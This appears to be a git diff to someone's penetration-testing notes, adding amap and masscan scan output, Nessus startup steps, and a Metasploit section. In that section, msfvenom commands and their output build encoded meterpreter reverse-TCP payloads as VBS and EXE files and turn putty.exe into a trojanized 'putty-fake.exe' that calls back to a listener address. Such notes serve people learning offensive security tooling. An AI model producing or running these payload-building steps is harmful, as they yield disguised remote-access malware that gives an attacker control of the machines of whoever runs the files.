@@ -112,22 +112,194 @@ For simplicity, I only run the core commands.
     2) nmap
 
     3) amap
+    ...    
+    amap v5.4 (www.thc.org/thc-amap) started at 2022-07-01 11:21:02 - APPLICATION MAPPING mode
 
-    4) masscan
+    Total amount of tasks to perform in plain connect mode: 23
+    DEBUG: probing now trigger http (1) on 150.107.31.61:443/tcp
+    DEBUG: probing now trigger ssl (1) on 150.107.31.61:443/tcp
+    DEBUG: probing now trigger ms-remote-desktop-protocol (1) on 150.107.31.61:443/tcp
+    DEBUG: probing now trigger netbios-session (3) on 150.107.31.61:443/tcp
+    DEBUG: probing now trigger netbios-session (1) on 150.107.31.61:443/tcp
+    DEBUG: probing now trigger ms-ds (1) on 150.107.31.61:443/tcp
+    DEBUG: probing now trigger smtp (1) on 150.107.31.61:443/tcp
+    DEBUG: probing now trigger ftp (1) on 150.107.31.61:443/tcp
+    DEBUG: probing now trigger rpc (1) on 150.107.31.61:443/tcp
+    DEBUG: probing now trigger dns (1) on 150.107.31.61:443/tcp
+    DEBUG: probing now trigger ldap (1) on 150.107.31.61:443/tcp
+    DEBUG: probing now trigger oracle-tns-listener (1) on 150.107.31.61:443/tcp
+    DEBUG: probing now trigger x-windows (1) on 150.107.31.61:443/tcp
+    DEBUG: probing now trigger sap-r3 (1) on 150.107.31.61:443/tcp
+    DEBUG: probing now trigger ms-sql (1) on 150.107.31.61:443/tcp
+    DEBUG: probing now trigger jrmi (1) on 150.107.31.61:443/tcp
+    DEBUG: probing now trigger nessus (1) on 150.107.31.61:443/tcp
+    DEBUG: probing now trigger webmin (1) on 150.107.31.61:443/tcp
+    DEBUG: probing now trigger db2 (1) on 150.107.31.61:443/tcp
+    DEBUG: probing now trigger jinilookupservice (1) on 150.107.31.61:443/tcp
+    DEBUG: probing now trigger slp (1) on 150.107.31.61:443/tcp
+    DEBUG: probing now trigger tivoli_tsm-server (1) on 150.107.31.61:443/tcp
+    DEBUG: probing now trigger norman-njeeves (1) on 150.107.31.61:443/tcp
+    Waiting for timeout on 23 connections ...
+    Protocol on 150.107.31.61:443/tcp (by trigger http) matches http
+    Protocol on 150.107.31.61:443/tcp (by trigger http) matches http-apache-2
+    Protocol on 150.107.31.61:443/tcp (by trigger ssl) matches ssl
+
+
+    4) masscan -> scan the internet! Literally, you can scan the whole internet if you have time...
+    
+    root@kali:~# masscan -p22,80,445 192.168.1.0/24
+
+    Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2014-05-13 21:35:12 GMT
+     -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+    Initiating SYN Stealth Scan
+    Scanning 256 hosts [3 ports/host]
+    Discovered open port 22/tcp on 192.168.1.217
+    Discovered open port 445/tcp on 192.168.1.220
+    Discovered open port 80/tcp on 192.168.1.230
     
 # Vulnerability scan:
 
-    1) CVE,CPE,CVSS
+    1) CVE,CPE,CVSS -> https://cve.mitre.org/
 
-    2) nmap
+    2) nmap 
 
     3) nessus
+    
+    sudo systemctl start nessusd && systemctl --no-pager status nessusd
+    
+    > sudo systemctl status nessusd
+
+    ● nessusd.service - The Nessus Vulnerability Scanner
+         Loaded: loaded (/lib/systemd/system/nessusd.service; disabled; vendor preset: disabled)
+         Active: active (running) since Fri 2022-07-01 12:41:42 CEST; 3min 20s ago
+       Main PID: 27467 (nessus-service)
+          Tasks: 15 (limit: 4589)
+         Memory: 1.0G
+            CPU: 20.892s
+         CGroup: /system.slice/nessusd.service
+                 ├─27467 /opt/nessus/sbin/nessus-service -q
+                 └─27469 nessusd -q
+
+    Jul 01 12:41:42 kali systemd[1]: Started The Nessus Vulnerability Scanner.
+    Jul 01 12:41:55 kali nessus-service[27469]: Cached 240 plugin libs in 67msec
+    Jul 01 12:41:55 kali nessus-service[27469]: Cached 240 plugin libs in 45msec
+
+    Then, you can go the app using this url, in my machine. Maybe you have to change that url for https://localhost:8834/#/
+    
+    https://kali:8834/#/scans/folders/my-scans
+    
+    Dont you remember user and password?
+    
+    https://docs.tenable.com/nessus/commandlinereference/Content/ChangeAUsersPassword.htm
+    
+    sudo systemctl stop nessusd
 
 # Exploitation and hacking of hosts
 
-    1) metasploit
+    1) metasploit -> THE framework to hack and exploit.
+    
+    sudo msfdb init && msfconsole
+    
+    https://www.kali.org/tools/metasploit-framework/
+    
+    https://www.offensive-security.com/metasploit-unleashed/
+    
+    2) msfvenom -> Payload Generator and Encoder
+    
+    > msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.85.139 LPORT=33534 -i 20  -e x86/shikata_ga_nai -a x86 --platform windows -f vbs > example.vbs
+    Found 1 compatible encoders
+    Attempting to encode payload with 20 iterations of x86/shikata_ga_nai
+    x86/shikata_ga_nai succeeded with size 381 (iteration=0)
+    x86/shikata_ga_nai succeeded with size 408 (iteration=1)
+    x86/shikata_ga_nai succeeded with size 435 (iteration=2)
+    x86/shikata_ga_nai succeeded with size 462 (iteration=3)
+    x86/shikata_ga_nai succeeded with size 489 (iteration=4)
+    x86/shikata_ga_nai succeeded with size 516 (iteration=5)
+    x86/shikata_ga_nai succeeded with size 543 (iteration=6)
+    x86/shikata_ga_nai succeeded with size 570 (iteration=7)
+    x86/shikata_ga_nai succeeded with size 597 (iteration=8)
+    x86/shikata_ga_nai succeeded with size 624 (iteration=9)
+    x86/shikata_ga_nai succeeded with size 651 (iteration=10)
+    x86/shikata_ga_nai succeeded with size 678 (iteration=11)
+    x86/shikata_ga_nai succeeded with size 705 (iteration=12)
+    x86/shikata_ga_nai succeeded with size 732 (iteration=13)
+    x86/shikata_ga_nai succeeded with size 759 (iteration=14)
+    x86/shikata_ga_nai succeeded with size 786 (iteration=15)
+    x86/shikata_ga_nai succeeded with size 813 (iteration=16)
+    x86/shikata_ga_nai succeeded with size 840 (iteration=17)
+    x86/shikata_ga_nai succeeded with size 867 (iteration=18)
+    x86/shikata_ga_nai succeeded with size 894 (iteration=19)
+    x86/shikata_ga_nai chosen with final size 894
+    Payload size: 894 bytes
+    Final size of vbs file: 7414 bytes
+    > ls example.vbs
+    example.vbs
+    
+    # Basically this commands creates a reverse_tcp windows exe app with your ip and port...
+    
+    > msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.85.139 LPORT=33534 -i 20  -e x86/shikata_ga_nai -a x86 --platform windows -f exe > example.exe
+    Found 1 compatible encoders
+    Attempting to encode payload with 20 iterations of x86/shikata_ga_nai
+    x86/shikata_ga_nai succeeded with size 381 (iteration=0)
+    x86/shikata_ga_nai succeeded with size 408 (iteration=1)
+    x86/shikata_ga_nai succeeded with size 435 (iteration=2)
+    x86/shikata_ga_nai succeeded with size 462 (iteration=3)
+    x86/shikata_ga_nai succeeded with size 489 (iteration=4)
+    x86/shikata_ga_nai succeeded with size 516 (iteration=5)
+    x86/shikata_ga_nai succeeded with size 543 (iteration=6)
+    x86/shikata_ga_nai succeeded with size 570 (iteration=7)
+    x86/shikata_ga_nai succeeded with size 597 (iteration=8)
+    x86/shikata_ga_nai succeeded with size 624 (iteration=9)
+    x86/shikata_ga_nai succeeded with size 651 (iteration=10)
+    x86/shikata_ga_nai succeeded with size 678 (iteration=11)
+    x86/shikata_ga_nai succeeded with size 705 (iteration=12)
+    x86/shikata_ga_nai succeeded with size 732 (iteration=13)
+    x86/shikata_ga_nai succeeded with size 759 (iteration=14)
+    x86/shikata_ga_nai succeeded with size 786 (iteration=15)
+    x86/shikata_ga_nai succeeded with size 813 (iteration=16)
+    x86/shikata_ga_nai succeeded with size 840 (iteration=17)
+    x86/shikata_ga_nai succeeded with size 867 (iteration=18)
+    x86/shikata_ga_nai succeeded with size 894 (iteration=19)
+    x86/shikata_ga_nai chosen with final size 894
+    Payload size: 894 bytes
+    Final size of exe file: 73802 bytes
+    > ls example.exe
+    example.exe
+    
+    # run this command to see output formats... 
+    > msfvenom --list formats
 
-    2) msfvenom
+    # I can create a custom version of whatever exe file, in this case, putty.exe 
+    
+    > msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.85.139 LPORT=33534 -i 20  -e x86/shikata_ga_nai -a x86 --platform windows -f exe -x /home/kali/Downloads/putty.exe -o putty-fake.exe
+    Found 1 compatible encoders
+    Attempting to encode payload with 20 iterations of x86/shikata_ga_nai
+    x86/shikata_ga_nai succeeded with size 381 (iteration=0)
+    x86/shikata_ga_nai succeeded with size 408 (iteration=1)
+    x86/shikata_ga_nai succeeded with size 435 (iteration=2)
+    x86/shikata_ga_nai succeeded with size 462 (iteration=3)
+    x86/shikata_ga_nai succeeded with size 489 (iteration=4)
+    x86/shikata_ga_nai succeeded with size 516 (iteration=5)
+    x86/shikata_ga_nai succeeded with size 543 (iteration=6)
+    x86/shikata_ga_nai succeeded with size 570 (iteration=7)
+    x86/shikata_ga_nai succeeded with size 597 (iteration=8)
+    x86/shikata_ga_nai succeeded with size 624 (iteration=9)
+    x86/shikata_ga_nai succeeded with size 651 (iteration=10)
+    x86/shikata_ga_nai succeeded with size 678 (iteration=11)
+    x86/shikata_ga_nai succeeded with size 705 (iteration=12)
+    x86/shikata_ga_nai succeeded with size 732 (iteration=13)
+    x86/shikata_ga_nai succeeded with size 759 (iteration=14)
+    x86/shikata_ga_nai succeeded with size 786 (iteration=15)
+    x86/shikata_ga_nai succeeded with size 813 (iteration=16)
+    x86/shikata_ga_nai succeeded with size 840 (iteration=17)
+    x86/shikata_ga_nai succeeded with size 867 (iteration=18)
+    x86/shikata_ga_nai succeeded with size 894 (iteration=19)
+    x86/shikata_ga_nai chosen with final size 894
+    Payload size: 894 bytes
+    Final size of exe file: 1449256 bytes
+    Saved as: putty-fake.exe
+    > ls -tatlh putty-fake.exe
+    -rw-r--r-- 1 kali kali 1.4M Jul  1 13:37 putty-fake.exe
 
     3) pesidous
 
